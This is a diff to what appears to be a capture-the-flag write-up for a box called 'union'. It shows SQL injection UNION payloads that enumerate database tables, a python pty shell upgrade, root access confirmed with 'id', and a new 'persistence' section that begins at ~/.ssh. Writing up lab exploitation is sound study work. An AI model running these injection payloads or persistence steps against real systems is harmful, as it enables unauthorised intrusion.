@@ -101,10 +101,6 @@ kali' union select 'batman' -- -
 ![SQLi - Burp - Intruder](images/sqli_player_burp_intruder_results.png)
 
 ```bash
-' union all select -- -
-```
-
-```bash
 ' union all select table_name from information_schema.tables where table_schema = 'november' limit 1 offset 0-- -
 ' union all select table_name from information_schema.tables where table_schema = 'november' limit 1 offset 1-- -
 ' union all select table_name from information_schema.tables where table_schema = 'november' limit 1 offset 2-- -
@@ -306,6 +302,8 @@ python3 -c "import pty;pty.spawn('/bin/bash')"
 root@union:/var/www/html# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
+
+## persistence
 
 ```bash
 $ cd ~/.ssh
